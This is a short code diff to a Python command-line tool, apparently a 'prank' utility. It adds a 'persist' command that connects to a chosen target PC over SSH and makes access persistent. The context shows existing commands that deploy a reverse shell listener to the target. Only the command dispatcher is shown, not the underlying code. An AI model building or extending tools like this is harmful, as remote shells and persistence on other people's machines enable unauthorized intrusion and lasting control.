@@ -75,8 +75,16 @@ def main():
             print(f"Listener started, deploying to {joke.target_pc}...")
             rsh_connection.deploy(joke.target_pc)
 
+        case cmd if "persist" in cmd:
+            if not joke.target_pc:
+                print("No target selected. Use 'target' first.")
+                return
+            joke.ssh_connection.connect(joke.target_pc)
+            joke.ssh_connection.make_persistent()
+            print(f"Persistence enabled on {joke.target_pc}")
+
         case _:
-            print("Help: [scan|list|prank|target|run|rsh]")
+            print("Help: [scan|list|prank|target|run|rsh|persist]")
             return
 
 
